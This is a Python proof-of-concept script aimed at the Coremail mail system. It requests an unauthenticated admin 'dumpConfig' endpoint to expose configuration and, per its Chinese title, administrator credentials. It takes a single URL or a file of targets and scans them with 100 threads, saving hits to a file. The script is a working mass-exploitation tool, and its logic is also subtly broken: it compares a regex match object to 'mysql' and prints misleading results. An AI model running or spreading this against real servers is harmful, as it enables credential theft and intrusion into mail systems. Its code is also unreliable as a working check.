#Coremail 邮件系统未授权访问获取管理员账密POC
import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text="""


     ██████╗ ██████╗ ██████╗ ███████╗███╗   ███╗ █████╗ ██╗██╗      ███████╗███╗   ███╗ █████╗ ██╗██╗     
    ██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗ ████║██╔══██╗██║██║      ██╔════╝████╗ ████║██╔══██╗██║██║     
    ██║     ██║   ██║██████╔╝█████╗  ██╔████╔██║███████║██║██║█████╗█████╗  ██╔████╔██║███████║██║██║     
    ██║     ██║   ██║██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══██║██║██║╚════╝██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
    ╚██████╗╚██████╔╝██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██║███████╗ ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗
     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                                                          
                                                          author:zm
"""
    print(text)
def main():
    banner()
    arges=argparse.ArgumentParser(description='This is Coremail email system unauthorized access to POC')
    arges.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    arges.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    arg=arges.parse_args()
    if arg.url and not arg.file:
        poc(arg.url)
    elif arg.file and not arg.url:
        url_list=[]
        with open (arg.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
            mp=Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    api='/mailsms/s?func=ADMIN:appState&dumpConfig=/'
    try:
        res=requests.get(url=target+api,verify=False,timeout=5)
    except:
        pass
    match = re.search(r'<string name="Driver">(.*?)</string>', res.text)
    if match=='mysql':
        print(f"[+]{target} have loophole “{target+api}”")
        with open ('result.txt','a',encoding='utf-8') as f:
            f.write(target+'\n')
    else:
        print(f"[-]{target} have loophole")
if __name__=='__main__':
    main()